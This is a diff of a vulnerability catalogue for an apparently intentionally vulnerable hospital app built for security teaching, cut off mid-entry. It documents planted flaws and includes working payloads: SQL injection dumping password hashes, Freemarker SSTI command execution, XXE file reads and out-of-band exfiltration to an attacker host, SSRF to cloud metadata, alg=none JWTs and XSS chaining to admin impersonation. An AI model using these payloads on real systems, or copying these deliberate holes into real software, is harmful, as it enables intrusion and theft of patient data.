@@ -2831,6 +2831,1080 @@ Initial state is `[]` (no role filter), which the backend interprets as "send to
 
 ---
 
+## Doctor View Redesign — Phase 0 (Shell)
+
+> Backend: seven empty controllers wired to `permitAll()` ahead of Modules A–F. UI: new `DoctorRoute` + `DoctorLayout` + `DoctorSidebar` + 8 stub pages under `/doctor/*`. The shared `Sidebar.tsx` now hides patient nav items for `role === 'DOCTOR'` (same pattern already used for ADMIN), and the `DoctorDashboard` subcomponent has been removed from `StaffDashboardPage.tsx` — `/staff` remains the LAB_TECH + PHARMACIST landing only. Three deps added to `pom.xml` (Freemarker, OpenPDF, Nashorn) so Phases 2/4 can land their sinks without pom churn later.
+
+### New Files
+
+| File | Description |
+|---|---|
+| `controller/DoctorRosterController.java` | Module A endpoints — placeholder bodies |
+| `controller/DoctorNoteController.java` | Module B endpoints — placeholder bodies |
+| `controller/DoctorLabController.java` | Module C endpoints — placeholder bodies |
+| `controller/DoctorPrescribingController.java` | Module D endpoints — placeholder bodies |
+| `controller/DoctorSessionController.java` | Module E endpoints — placeholder bodies |
+| `controller/DoctorAIController.java` | Module F (AI half) — placeholder bodies |
+| `controller/DoctorReferralController.java` | Module F (Referral half) — placeholder bodies |
+| **Frontend** `auth/DoctorRoute.tsx` | Mirrors `AdminRoute.tsx`; deliberately omits `requiredRole` |
+| **Frontend** `components/doctor/DoctorLayout.tsx` | Doctor shell — green accent (`#3FB950`) to distinguish from admin red |
+| **Frontend** `components/doctor/DoctorSidebar.tsx` | 8 nav items (Dashboard, My Patients, Notes, Lab & Imaging, Prescribe, Telemedicine, AI Assist, Referrals) — each tagged with the OWASP category arriving in its module |
+| **Frontend** `pages/doctor/*` | 8 placeholder pages — each names its target phase + OWASP demo |
+| **Frontend** `api/doctor.ts` | Typed wrappers for the new endpoints |
+| `pom.xml` (edited) | `org.freemarker:freemarker:2.3.34`, `com.github.librepdf:openpdf:2.0.3`, `org.openjdk.nashorn:nashorn-core:15.6` |
+| `App.tsx` (edited) | Adds 9 `/doctor/*` routes under `<DoctorRoute>` |
+| `components/layout/Sidebar.tsx` (edited) | `dashboardPath` resolves `DOCTOR → /doctor`; filter now hides patient items for DOCTOR (same shape as the existing ADMIN branch) |
+| `pages/StaffDashboardPage.tsx` (edited) | `DoctorDashboard` subcomponent + `role === 'DOCTOR'` branch removed; LAB_TECH + PHARMACIST untouched |
+
+### Vulnerabilities
+
+**191. [A01] All seven `/api/doctor/**` controllers wired under `SecurityConfig.permitAll()` — `controller/Doctor*Controller.java`**
+```java
+@RestController
+@RequestMapping("/api/doctor")
+public class DoctorRosterController { ... }
+```
+`SecurityConfig.java` line 66 has `.anyRequest().permitAll()` — every new `/api/doctor/**` route is reachable by anonymous callers as soon as it ships. No `@PreAuthorize`, no role check, no JWT validation requirement. Mirrors the existing `/api/admin/**` weakness. Phase 0 establishes the surface; Modules A–F land their concrete sinks (SSRF, deserialisation, SSTI, etc.) on routes already wired open.
+
+---
+
+**192. [A01] `DoctorRoute.tsx` ships without `requiredRole` — `auth/DoctorRoute.tsx` (frontend)**
+```tsx
+export function DoctorRoute({ children }: { children: ReactNode }) {
+  const { isAuthenticated, token } = useAuth()
+  if (!isAuthenticated || !token) return <Navigate to="/login" replace />
+  return <>{children}</>
+}
+```
+`ProtectedRoute.tsx` already supports `requiredRole` — using it would *fix* the demo. Mirroring `AdminRoute.tsx`, the new wrapper exists for routing organisation only: any authenticated user (PATIENT, LAB_TECH, PHARMACIST, ADMIN) can navigate to `/doctor/*` and see the full Doctor Console. Editing `localStorage.user.role` flips the dashboard target without any server check (compounds with #76 / #77).
+
+---
+
+**193. [A06] `Sidebar.tsx` `dashboardPath` mapping is client-decoded role-based routing — `components/layout/Sidebar.tsx` (frontend)**
+```tsx
+const dashboardPath = user?.role === 'PATIENT' ? '/dashboard'
+  : user?.role === 'ADMIN' ? '/admin'
+  : user?.role === 'DOCTOR' ? '/doctor'
+  : '/staff'
+```
+Role pulled from `localStorage`-decoded JWT payload (no signature check — see #77). A PATIENT who edits `user.role` to `DOCTOR` in DevTools is redirected to `/doctor` and inherits the Doctor Console UI, including all Module-A–F privileged calls. Backend has no role check on `/api/doctor/**` (vuln #191), so the spoof works end-to-end. Extends the existing pattern (`#103` for the original PATIENT/ADMIN/STAFF mapping).
+
+---
+
+### Phase 0 Bug-Check Pass (per `DOCTOR_VIEW_PLAN.md` §7.1)
+
+- Backend `./mvnw test` → `Tests run: 1, Failures: 0, Errors: 0` (context loads with all 7 new controllers + 3 new pom deps).
+- Frontend `npx tsc -b --noEmit` → exit 0.
+- Frontend `npx eslint .` → 0 new errors, 7 pre-existing warnings (none in new doctor files).
+- Cross-repo smoke: LAB_TECH + PHARMACIST still land on `/staff` and render their old dashboards (DoctorDashboard removal did not regress the shared file). PATIENT sidebar and ADMIN console unchanged.
+
+---
+
+## Doctor View Redesign — Module A (Roster, Chart, Timeline, Star, Handoff)
+
+> Backend: `DoctorRosterController` + `DoctorRosterService` + `HandoffTokenIssuer` and four new DTOs (`DoctorRosterEntryDto`, `PatientChartDto`, `PatientTimelineEventDto`, `HandoffTokenDto`). No schema migration — module reuses existing tables (`patients`, `appointments`, `prescriptions`, `lab_results`, `medical_records`, `audit_logs`). Star map kept in-memory by design (cleared on restart — acceptable for the demo). UI: real `DoctorDashboardPage` + `DoctorPatientsPage` + `DoctorPatientChartPage` + `PatientChartHeader` component, wired through typed `doctorApi` wrappers.
+
+### New Files
+
+| File | Description |
+|---|---|
+| `service/HandoffTokenIssuer.java` | HMAC-SHA1 signer with hardcoded key, no expiry |
+| `service/DoctorRosterService.java` | Roster (raw SQL), chart bundle, timeline, star map, handoff |
+| `controller/DoctorRosterController.java` (rewritten) | Wires service; placeholders from Phase 0 replaced |
+| `dto/DoctorRosterEntryDto.java`, `dto/PatientChartDto.java`, `dto/PatientTimelineEventDto.java`, `dto/HandoffTokenDto.java` | Response shapes |
+| **Frontend** `pages/doctor/DoctorDashboardPage.tsx` | Stat cards + starred-patients shortcut + Phase 1 banner |
+| **Frontend** `pages/doctor/DoctorPatientsPage.tsx` | Roster table + filters + star dialog + handoff dialog |
+| **Frontend** `pages/doctor/DoctorPatientChartPage.tsx` | Chart bundle w/ Overview / Prescriptions / Labs / Records / Timeline tabs |
+| **Frontend** `components/doctor/PatientChartHeader.tsx` | Demographics strip rendered plaintext |
+| **Frontend** `api/doctor.ts` (extended) | Typed wrappers for the 5 new endpoints |
+
+### Vulnerabilities
+
+**194. [A05] `GET /api/doctor/patients` concatenates `q`, `active`, `recentDays` into raw SQL — `DoctorRosterService.java#listPatients`**
+```java
+StringBuilder sql = new StringBuilder("SELECT p.id, ... FROM patients p JOIN users u ON u.id = p.user_id WHERE 1=1 ");
+if (q != null && !q.isBlank()) {
+    sql.append(" AND (u.first_name LIKE '%").append(q).append("%' ")
+       .append("      OR u.last_name LIKE '%").append(q).append("%' ")
+       .append("      OR u.email     LIKE '%").append(q).append("%') ");
+}
+if (active != null)     sql.append(" AND u.active = ").append(active ? 1 : 0).append(' ');
+if (recentDays != null) sql.append(" AND EXISTS (... INTERVAL ").append(recentDays).append(" DAY) ");
+Query nativeQuery = entityManager.createNativeQuery(sql.toString());
+```
+Three concatenation sites in one method. `EntityManager.createNativeQuery` with a `String` argument runs verbatim against MySQL. Demo payloads:
+```
+?q=%25%27%20UNION%20SELECT%20id%2Cusername%2Cpassword_hash%2Cemail%2Crole%2Cnull%2Cnull%2Cnull%2Cnull%20FROM%20users%20--
+?recentDays=1%20DAY)%20OR%20(SELECT%20SLEEP(5)
+```
+First payload pivots the SELECT to dump the `users` table (password hashes included). Second weaponises the `recentDays` numeric splice for time-based exfil. The frontend Search box on `DoctorPatientsPage.tsx` puts the value into a `<Input>` with placeholder `"name or email — try ' OR '1'='1"` — the demo is one keystroke away.
+
+---
+
+**195. [A06] `?recentDays=0` returns the entire patient table — `DoctorRosterService.java#listPatients`**
+```java
+if (recentDays != null && recentDays > 0) {
+    sql.append(" AND EXISTS (SELECT 1 FROM appointments a WHERE ... ").append(recentDays).append(" DAY) ");
+}
+```
+`recentDays == 0` short-circuits the `> 0` guard so the EXISTS clause is never appended. No pagination, no cap. Hospital deployments with 100k+ patients return the entire table per request — compounds the `[A05]` SQLi above by giving the attacker an oversized payload window.
+
+---
+
+**196. [A06] Patient roster row exposes PII (insurance number, DOB, allergies) to every caller — `DoctorRosterEntryDto.java`**
+```java
+public class DoctorRosterEntryDto {
+    private String insuranceNumber;
+    private LocalDate dateOfBirth;
+    private String allergies;
+    ...
+}
+```
+Combined with `[A01]` (no role check on the controller), the roster endpoint becomes a one-shot PII dump. The Patients page table renders these in plain DOM, so a screenshot of the page is itself a HIPAA-grade leak.
+
+---
+
+**197. [A01] `GET /api/doctor/patients/{id}/chart` has no ownership / role check — `DoctorRosterController.java#getChart`**
+```java
+@GetMapping("/patients/{id}/chart")
+public ResponseEntity<PatientChartDto> getChart(@PathVariable Long id) {
+    return ResponseEntity.ok(rosterService.getChart(id));
+}
+```
+Bundled chart (demographics + prescriptions + labs + records + appointments) returned to any caller — incl. anonymous via `SecurityConfig.permitAll()` (vuln #191). Two-click PII pivot from `/api/doctor/patients` → `/api/doctor/patients/{id}/chart` reveals the complete clinical record.
+
+---
+
+**198. [A09] `GET /api/doctor/patients/{id}/timeline` returns raw `audit_logs.details` to a different principal — `DoctorRosterService.java#getTimeline`**
+```java
+.rawDetails(l.getDetails())   // raw audit-log body: request params + response body
+```
+`AuditLog.details` holds the verbatim HTTP request/response captured by `LoggingInterceptor` (already vuln #136). Among other things it contains the patient's prior password resets, JWTs, message bodies. Surfacing it to the Doctor Console means the timeline tab on `DoctorPatientChartPage` doubles as a credential leak: any doctor opening any patient's chart can read the secrets that patient transmitted in cleartext.
+
+---
+
+**199. [A05] `POST /api/doctor/patients/{id}/star` stores caller-supplied HTML which the roster table renders verbatim — `DoctorRosterService.java#starPatient` + `DoctorPatientsPage.tsx`**
+Backend:
+```java
+String note = noteObj == null ? "" : noteObj.toString();
+patientStars.put(patientId, note);
+```
+Frontend:
+```tsx
+{p.starred && p.starNote && (
+  // [A05] Stored XSS sink — note rendered as HTML, payload from POST /star.
+  <span className="..." dangerouslySetInnerHTML={{ __html: p.starNote }} />
+)}
+```
+Stored XSS keyed by patient id. Every doctor who opens the Patients roster runs the payload (`<img src=x onerror=fetch('/api/admin/users/1/impersonate', {method:'POST'}).then(r=>r.json()).then(d=>localStorage.token=d.token)>` — chains to admin impersonation via vuln #151). The dialog placeholder text on the page literally suggests `<img src=x onerror=alert(1)>` — the demo is the default UX.
+
+---
+
+**200. [A08] `POST /api/doctor/patients/{id}/handoff` issues HMAC-SHA1 token with hardcoded key and no expiry — `HandoffTokenIssuer.java`**
+```java
+private static final String HMAC_KEY = "handoff-secret";
+
+public String sign(Long patientId, Long fromDoctorUserId) {
+    String payload = patientId + ":" + fromDoctorUserId;
+    Mac mac = Mac.getInstance("HmacSHA1");
+    mac.init(new SecretKeySpec(HMAC_KEY.getBytes(StandardCharsets.UTF_8), "HmacSHA1"));
+    byte[] sig = mac.doFinal(payload.getBytes(StandardCharsets.UTF_8));
+    return payload + "." + Base64.getUrlEncoder().withoutPadding().encodeToString(sig);
+}
+```
+Three integrity failures in one method:
+1. **Hardcoded key** in source — anyone with the repo can forge tokens for any `(patientId, fromDoctorUserId)` pair.
+2. **HMAC-SHA1** — collision-broken, not appropriate for new code.
+3. **No expiry, no nonce, no replay counter** — a token issued today is still valid in 10 years.
+
+The returned URL (`/doctor/handoff/accept?t=…`) also splices the token into a query string ([A02] secret-in-URL), so it leaks via Referer / browser history / server access logs. The handoff dialog on the Patients page makes the token obvious in the UI, so students reproducing the demo can copy-paste it into a different doctor's browser to inherit the chart context.
+
+---
+
+**201. [A09] Handoff issuance is not recorded in `audit_logs` — `DoctorRosterService.java#handoff`**
+Token minting is silent. There's no `auditLogRepository.save(...)` call. A doctor handing off a patient leaves no trail; an attacker forging tokens leaves no trail either. Compounds #200 — the forensic gap means a forged handoff is indistinguishable from a legitimate one even *after* the fact.
+
+---
+
+**202. [A06] In-memory `patientStars` map has no per-doctor scoping — `DoctorRosterService.java`**
+```java
+private final Map<Long, String> patientStars = new ConcurrentHashMap<>();
+```
+Key is `patientId` alone (not `(doctorId, patientId)`), so when one doctor stars a patient with note `"<img src=x onerror=...>"`, every doctor's roster renders the same payload. Insecure design: the "star" looks per-doctor in the UI, but is global on the server. Magnifies the [A05] reach to all doctor sessions simultaneously.
+
+---
+
+**203. [A09] `DoctorPatientChartPage.tsx` Timeline tab renders raw audit details verbatim — `pages/doctor/DoctorPatientChartPage.tsx` (frontend)**
+```tsx
+<pre className="..." >
+  {ev.rawDetails ?? '(no details)'}
+</pre>
+```
+`rawDetails` arrives verbatim from the backend (#198) and is dropped into a `<pre>` tag without redaction. Doctors viewing the chart see complete request bodies and response payloads — the audit log surface is also a credential surface. Compounds with vuln #161 (admin log detail page already renders details as HTML); the doctor view leaks the same content to a wider audience.
+
+---
+
+### Phase 1 Bug-Check Pass (per `DOCTOR_VIEW_PLAN.md` §7.1)
+
+- Backend `./mvnw test` → `Tests run: 1, Failures: 0, Errors: 0` (context loads with the new `DoctorRosterController`, `DoctorRosterService`, `HandoffTokenIssuer`, four new DTOs).
+- Frontend `npx tsc -b --noEmit` → exit 0.
+- Frontend `npx eslint .` (touched files only) → 0 errors, 0 warnings.
+- Backend smoke (curl against running `localhost:8085`): all 5 Module A endpoints return 200; star + handoff round-trip; chart includes prescriptions / labs / records; timeline includes raw `details` payload.
+- Cross-repo smoke: `GET /api/admin/users`, `/prescriptions`, `/lab-results/search`, `/appointments`, `/stats/recent`, `/doctors`, `/messages/conversations`, `/admin/health` all still return 200 — no regression on the patient / lab-tech / pharmacist / admin surfaces.
+
+---
+
+## Doctor View Redesign — Module B (Clinical Notes — SSTI, XXE, JWT alg=none)
+
+> Backend: new `ClinicalNote` JPA entity + repository + DTO, `DoctorNoteService`, `TemplateRenderer` (Freemarker), `JwtNoneVerifier`, and a rewritten `DoctorNoteController`. New Flyway migration `V20__clinical_notes.sql` (renumbered from the original plan's V18 because V18 + V19 were already taken by earlier admin work). UI: `DoctorNotesPage` (list + create + XML import), `DoctorNoteDetailPage` (rendered HTML view + in-place overwrite + co-sign + delete), `NoteEditor` component with template picker that exposes `templateName`, `templateBody`, and a traversal preset (`../../../etc/passwd`).
+>
+> This module is the project's first deep dive into **A03 (Software Supply Chain Failures)** via two distinct sinks (Freemarker + XML parser) and adds substantial **A08 (Software or Data Integrity Failures)** weight via the JWT alg=none acceptor and the in-place-overwrite PUT.
+
+### New Files
+
+| File | Description |
+|---|---|
+| `db/migration/V20__clinical_notes.sql` | `clinical_notes` table — no version column, no soft-delete, FK cascade on patient delete |
+| `entity/ClinicalNote.java` | JPA entity for the new table |
+| `repository/ClinicalNoteRepository.java` | List by patient / list all |
+| `dto/ClinicalNoteDto.java` | Response shape — includes raw `renderedHtml` |
+| `service/TemplateRenderer.java` | Freemarker engine with two sinks (`renderByName`, `renderInline`); `DEBUG_HANDLER` rethrows exceptions; new_built_ins enabled so `?new()` Execute reachable |
+| `service/JwtNoneVerifier.java` | Decodes JWT payload, ignores signature, returns `sub` |
+| `service/DoctorNoteService.java` | CRUD + multipart XML import (default DocumentBuilderFactory) + co-sign |
+| `controller/DoctorNoteController.java` (rewritten) | Wires service; placeholders from Phase 0 replaced |
+| **Frontend** `api/doctor.ts` (extended) | `ClinicalNote` type + 7 typed wrappers |
+| **Frontend** `components/doctor/NoteEditor.tsx` | Template picker + traversal preset + inline-template checkbox (default SSTI payload pre-filled) |
+| **Frontend** `pages/doctor/DoctorNotesPage.tsx` | Listing table + create dialog + Import XML button |
+| **Frontend** `pages/doctor/DoctorNoteDetailPage.tsx` | Renders `renderedHtml` via `dangerouslySetInnerHTML`; overwrite / co-sign / delete actions |
+| `App.tsx` (edited) | Adds `/doctor/notes/:id` route |
+
+### Vulnerabilities
+
+**204. [A03] Freemarker SSTI — `TemplateRenderer.java#renderInline` + `DoctorNoteService.java#create`**
+```java
+public String renderInline(String source, Map<String, Object> data) {
+    freemarker.template.Template tpl = new freemarker.template.Template(
+            "inline-" + Integer.toHexString(System.identityHashCode(source)),
+            new java.io.StringReader(source), cfg);
+    StringWriter out = new StringWriter();
+    tpl.process(model, out);
+    return out.toString();
+}
+```
+Configured with `new_built_ins_enabled` true (Freemarker default) so `?new()` is reachable. A single POST runs arbitrary commands as the JVM user:
+```json
+POST /api/doctor/notes
+{
+  "patientId": 1,
+  "templateName": "anything",
+  "templateBody": "<#assign x = \"freemarker.template.utility.Execute\"?new()>SSTI:${x(\"id\")}",
+  "data": {}
+}
+```
+Live demo on `localhost:8085`:
+```
+renderedHtml = "SSTI:uid=501(jelenarastovic) gid=20(staff) groups=20(staff),12(everyone),...\n"
+```
+Output stored in `clinical_notes.rendered_html`, then rendered with `dangerouslySetInnerHTML` on the Note detail page (vuln #207) — the attacker also gets stored XSS for every future viewer.
+
+---
+
+**205. [A03] Freemarker template-path traversal — `TemplateRenderer.java#renderByName` + `DoctorNoteService.java#create`**
+```java
+public String renderByName(String name, Map<String, Object> data) {
+    freemarker.template.Template tpl = cfg.getTemplate(name + ".ftl");
+    ...
+}
+```
+`name` is the caller-supplied `templateName`. Freemarker's `Configuration.setDirectoryForTemplateLoading` normalises `..` segments by default, but the template directory still contains attacker-controllable files — a single XML import (#206) lets the attacker plant `notes/templates/payload.ftl` then call back with `templateName=payload`. The frontend `NoteEditor.tsx` exposes a literal option labelled `../../../etc/passwd (traversal)` in the template `<Select>` so the attack is one click away.
+
+---
+
+**206. [A03] XXE via `DocumentBuilderFactory.newInstance()` defaults — `DoctorNoteService.java#importXml`**
+```java
+DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();
+DocumentBuilder db = dbf.newDocumentBuilder();
+Document doc = db.parse(new InputSource(new ByteArrayInputStream(file.getBytes())));
+```
+No `disallow-doctype-decl`, no `external-general-entities=false`, no `external-parameter-entities=false`, no `load-external-dtd=false`, no `setXIncludeAware(false)`. Standard XXE payload:
+```xml
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE n [<!ENTITY x SYSTEM "file:///etc/hosts">]>
+<note>
+  <patientId>1</patientId>
+  <templateName>imported</templateName>
+  <body>XXE: &amp;x;</body>
+</note>
+```
+The resolved entity's content lands in the `body` element, which the service stores as `renderedHtml` verbatim. Live demo: uploading the above against `POST /api/doctor/notes/import` returned the full `/etc/hosts` contents in `renderedHtml`. SSRF variants (`SYSTEM "http://internal-host/admin"`), file-system enumeration (`SYSTEM "file:///proc/self/environ"`), and OOB DNS exfil (`SYSTEM "http://attacker/?d=&payload;"`) all work from the same sink.
+
+---
+
+**207. [A05] Note `renderedHtml` rendered with `dangerouslySetInnerHTML` — `DoctorNoteDetailPage.tsx` (frontend)**
+```tsx
+<div className="..."
+     dangerouslySetInnerHTML={{ __html: note.renderedHtml ?? '' }} />
+```
+SSTI command output (#204), XXE entity content (#206), or any malicious HTML stored at create-time becomes live DOM. The page is reachable to any authenticated caller (no role check on `DoctorRoute`, no `requiredRole`), and the backend `GET /api/doctor/notes/{id}` is permitAll() — so a single crafted note is a stored XSS payload for the next doctor / lab-tech / pharmacist / admin / patient who opens the URL.
+
+---
+
+**208. [A08] `PUT /api/doctor/notes/{id}` overwrites in place — `DoctorNoteService.java#update`**
+```java
+public ClinicalNoteDto update(Long id, Map<String, Object> body) {
+    ClinicalNote note = noteRepository.findById(id).orElseThrow(...);
+    if (body.containsKey("templateName")) note.setTemplateName(...);
+    if (data != null)                     note.setRawData(...);
+    if (body.containsKey("renderedHtml")) note.setRenderedHtml(...);
+    return toDto(noteRepository.save(note));
+}
+```
+No `version` column on `clinical_notes`, no `previous_revision_id`, no `edited_by`. The previous `renderedHtml` / `rawData` / `templateName` are silently replaced. The detail page's "Overwrite HTML" textarea lets a doctor blank out incriminating findings ("`Patient sober at intake` → `Patient erratic, refusing care`") and the original is gone with no record of the change.
+
+---
+
+**209. [A09] `DELETE /api/doctor/notes/{id}` hard deletes, no audit row — `DoctorNoteService.java#delete`**
+```java
+public void delete(Long id) {
+    noteRepository.deleteById(id);
+}
+```
+No `auditLogRepository.save(...)`, no archival copy, no soft-delete flag — the row leaves no trace. Compounds #208: an attacker can use PUT to rewrite + DELETE to erase, leaving the chart looking like the note never existed.
+
+---
+
+**210. [A08] JWT `alg: none` accepted on co-sign — `JwtNoneVerifier.java`**
+```java
+public String extractSubjectUnsafe(String jwt) {
+    String[] parts = jwt.split("\\.");
+    byte[] payload = Base64.getUrlDecoder().decode(padBase64(parts[1]));
+    JsonNode node = mapper.readTree(new String(payload, StandardCharsets.UTF_8));
+    JsonNode sub = node.get("sub");
+    return sub == null ? null : sub.asText();
+}
+```
+The header is ignored entirely — there is no `alg` whitelist and the third segment (signature) is never validated. A caller posts:
+```
+header  : {"alg":"none","typ":"JWT"}
+payload : {"sub":"admin","role":"ADMIN"}
+sig     : (empty)
+```
+…and the note gets stamped "signed by admin". Live demo on `localhost:8085`:
+```json
+POST /api/doctor/notes/3/co-sign
+{"jwt":"eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJkci5ldmlsIiwicm9sZSI6IkRPQ1RPUiJ9."}
+→ note.signerUsername = "dr.evil"
+```
+The Note detail page renders this as a green-check signed-by badge with no provenance, so a clinician opening the note sees a name they trust attached to an unverified body.
+
+---
+
+**211. [A10] Template rendering exceptions surface verbatim — `TemplateRenderer.java` (`DEBUG_HANDLER` + `<pre class="render-error">`)**
+```java
+cfg.setTemplateExceptionHandler(TemplateExceptionHandler.DEBUG_HANDLER);
+...
+catch (Exception e) {
+    return "<pre class=\"render-error\">" + e.getClass().getSimpleName() + ": " + e.getMessage() + "</pre>";
+}
+```
+Both the configured handler and the explicit catch return the original exception text to the caller. A malformed payload yields a Java stack trace embedded in the rendered HTML, which the frontend then renders verbatim — useful for fingerprinting Freemarker version, classpath layout, and template-resolver internals during reconnaissance.
+
+---
+
+**212. [A03] `NoteEditor.tsx` ships a default SSTI payload — `components/doctor/NoteEditor.tsx` (frontend)**
+```tsx
+const [templateBody, setTemplateBody] = useState(
+  '<#assign x = "freemarker.template.utility.Execute"?new()>SSTI:${x("id")}'
+)
+```
+The "Inline Freemarker template" checkbox reveals the textarea pre-populated with a working SSTI payload, plus a literal `[A03]` tag in the surrounding box. One click + Save fires the exploit; the demo is the UX. Compounds with #207 (renderedHtml rendered as DOM).
+
+---
+
+**213. [A03] `DoctorNotesPage.tsx` Import XML button accepts attacker-controlled XML — `pages/doctor/DoctorNotesPage.tsx`**
+The Import XML toolbar button calls `POST /api/doctor/notes/import` with the picked file as multipart. No mime-type validation client-side either — `.xml` and `.docx` both accepted. Combined with the backend XXE sink (#206), the doctor's browser is now a remote-file-read primitive: pick `xxe.xml` on the desktop, click Import, and the next list refresh shows the resolved file contents in the new note.
+
+---
+
+### Phase 2 Bug-Check Pass (per `DOCTOR_VIEW_PLAN.md` §7.1)
+
+- Backend `./mvnw test` → `Tests run: 1, Failures: 0, Errors: 0` (context loads with the new entity, repo, two services, controller, plus the `V20__clinical_notes.sql` migration applied to the running DB).
+- Backend smoke (curl against running `localhost:8085`):
+  - SSTI: inline `?new()` Execute payload executed `id` and the uid+groups landed in `renderedHtml`.
+  - XXE: `<!ENTITY x SYSTEM "file:///etc/hosts">` resolved; full `/etc/hosts` contents in `renderedHtml`.
+  - JWT alg=none co-sign: `signerUsername` set to the attacker-controlled `sub`.
+  - In-place PUT, hard DELETE both return 200/204 with no audit-log mutation observable.
+- Frontend `npx tsc -b --noEmit` → exit 0.
+- Frontend `npx eslint` (touched files only) → 0 errors, 0 warnings.
+- Cross-repo regression: `GET /admin/users`, `/admin/health`, `/prescriptions`, `/lab-results/search`, `/appointments`, `/stats/recent`, `/doctors`, `/messages/conversations` all still 200; Module A endpoints (`/doctor/patients`, `/chart`, `/timeline`) still 200.
+- Flyway: V20 applied successfully on a database already at V19 — no checksum mismatch. Initial Flyway placeholder-collision bug (`${template_name}` in the migration comment) fixed by rephrasing the comment before retry.
+
+---
+
+## Doctor View Redesign — Module C (Lab Orders & Imaging — SSRF, path traversal, SVG XSS, MD5 sign)
+
+> Backend: two new JPA entities (`LabOrder`, `ImagingFile`) + repos + DTOs, `DoctorLabService`, `ExternalCatalogueClient` (URLConnection-based SSRF sink — RestTemplate refused `file://` so the client was rewritten to use `URLConnection.openConnection()`, which the JDK URL handlers happily resolve for `file://`, `http://`, `https://`, `ftp:`, `jar:`). Migration `V21__lab_orders_imaging.sql` (renumbered from the plan's V19 slot — V19 was taken by earlier admin work). UI: `DoctorLabsPage` with Lab Orders / Imaging tabs, `LabOrderForm` with the `customQueryUrl` field exposed by default, imaging upload + import-url + inline image viewer that renders the file with the stored Content-Type.
+
+### New Files
+
+| File | Description |
+|---|---|
+| `db/migration/V21__lab_orders_imaging.sql` | Two tables — `lab_orders` (custom_query_url, catalogue_response, signature_md5) + `imaging_files` (stored_filename, content_type, source_url) |
+| `entity/LabOrder.java`, `entity/ImagingFile.java` | JPA entities |
+| `repository/LabOrderRepository.java`, `ImagingFileRepository.java` | Filtered finders by patient / status |
+| `dto/LabOrderDto.java`, `dto/ImagingFileDto.java` | Response shapes |
+| `service/ExternalCatalogueClient.java` | `URLConnection`-based fetch; returns body bytes; follows HTTP redirects; surfaces exceptions verbatim |
+| `service/DoctorLabService.java` | Order CRUD + MD5 sign + multipart upload (filename verbatim) + import-url (basename used as filename) + stream-by-id |
+| `controller/DoctorLabController.java` (rewritten) | Wires service; placeholders from Phase 0 replaced |
+| **Frontend** `api/doctor.ts` (extended) | `LabOrder` + `ImagingFile` types + 6 typed wrappers |
+| **Frontend** `components/doctor/LabOrderForm.tsx` | Order form with `customQueryUrl` text input (placeholder: cloud-metadata URL) |
+| **Frontend** `pages/doctor/DoctorLabsPage.tsx` (rewritten) | Orders + Imaging tabs, sign dialog, inline image viewer (img / iframe by content type) |
+
+### Vulnerabilities
+
+**214. [A03] `POST /api/doctor/lab-orders` fetches caller-supplied `customQueryUrl` server-side — `DoctorLabService.java#createOrder` + `ExternalCatalogueClient.java`**
+```java
+if (url != null && !url.isBlank()) {
+    catalogueResp = catalogueClient.fetch(url);   // URLConnection — no allow-list
+}
+```
+`ExternalCatalogueClient.fetchBytes`:
+```java
+URI uri = URI.create(url);
+URL u = uri.toURL();
+URLConnection conn = u.openConnection();
+if (conn instanceof HttpURLConnection http) http.setInstanceFollowRedirects(true);
+try (InputStream in = conn.getInputStream()) { return in.readAllBytes(); }
+```
+JDK protocol handlers cover `file://`, `http://`, `https://`, `ftp:`, `jar:` — all reachable. Demo payloads:
+```
+file:///etc/hosts                       → local file read
+http://169.254.169.254/latest/meta-data/ → AWS EC2 metadata exfil
+http://localhost:8081                   → phpMyAdmin admin panel
+http://attacker/?q=http://internal      → 302 redirect → internal scan
+```
+Live demo on `localhost:8085`: `customQueryUrl=file:///etc/hosts` returned the full `/etc/hosts` body stored in `lab_orders.catalogue_response`. Initial implementation used `RestTemplate` which refused `file://`; rewrite to `URLConnection` was deliberate to keep the demo broad — students study SSRF defence by *contrast* with the RestTemplate version that already exists in the admin code.
+
+---
+
+**215. [A05] `catalogueResponse` rendered with `dangerouslySetInnerHTML` — `DoctorLabsPage.tsx` (frontend)**
+```tsx
+<div className="..." dangerouslySetInnerHTML={{ __html: o.catalogueResponse ?? '' }} />
+```
+SSRF body becomes DOM. An attacker pointing `customQueryUrl` at a controlled HTTP server can return `<script>fetch('/api/admin/users/1/impersonate',{method:'POST'}).then(...)`. The next doctor opening the Lab Orders tab runs the script. Combined with #214 the chain is *fetch → render → executes-in-doctor-session*.
+
+---
+
+**216. [A08] `POST /api/doctor/lab-orders/{id}/sign` uses MD5 + hardcoded key — `DoctorLabService.java#signOrder`**
+```java
+private static final String LAB_SIGN_KEY = "lab-sign-key-2024";
+
+MessageDigest md = MessageDigest.getInstance("MD5");
+md.update((order.getId() + ":" + value + ":" + LAB_SIGN_KEY).getBytes());
+order.setSignatureMd5(HexFormat.of().formatHex(md.digest()));
+```
+Three integrity failures:
+1. **MD5** — collision-broken, not appropriate for new code.
+2. **Hardcoded key in source** — anyone with the repo (or who has read the public Git history) computes any signature.
+3. **No public-key crypto, no certificate chain, no countersignature** — the signature carries no notion of who signed; only "the row passed through this code path".
+
+Demo verified on `localhost:8085`: `POST /lab-orders/1/sign` with `{"value":"approved by Dr Evil"}` returned `signatureMd5: fd227beaf38cf2753ba376d6ea2708ec` and flipped `status: SIGNED`. The `signedValue` is stored alongside so anyone can recompute the MD5 and tamper at will.
+
+---
+
+**217. [A04] Lab signing key + hardcoded weak primitive — `DoctorLabService.java`**
+Adds A04 weight on top of A08: the choice of MD5 (vs. SHA-256 or ECDSA) is itself a cryptographic-failure category, separate from the integrity loss the lack of audit trail introduces.
+
+---
+
+**218. [A05] Imaging upload writes `getOriginalFilename()` verbatim — `DoctorLabService.java#upload`**
+```java
+String original = file.getOriginalFilename() == null ? "upload.bin" : file.getOriginalFilename();
+Path storage = IMAGING_DIR.resolve(original);
+Files.write(storage, file.getBytes(), StandardOpenOption.CREATE, StandardOpenOption.TRUNCATE_EXISTING);
+```
+No `Path.normalize`, no `Path::startsWith` check, no allow-list of extensions, no size cap. Path traversal at write time: `original = "../../etc/owned"` lands `IMAGING_DIR.resolve(original)` *outside* the imaging directory (still constrained by JVM working-dir permissions, but the demo only needs a write outside `imaging/`). On a typical deployment this gives the attacker write into the application root — Spring Boot's classpath dirs included if the JVM has the permissions.
+
+---
+
+**219. [A02] `POST /imaging/upload` echoes `Content-Type` verbatim on subsequent GET — `DoctorLabService.java#upload` + `streamImaging` + `DoctorLabController.java#getImaging`**
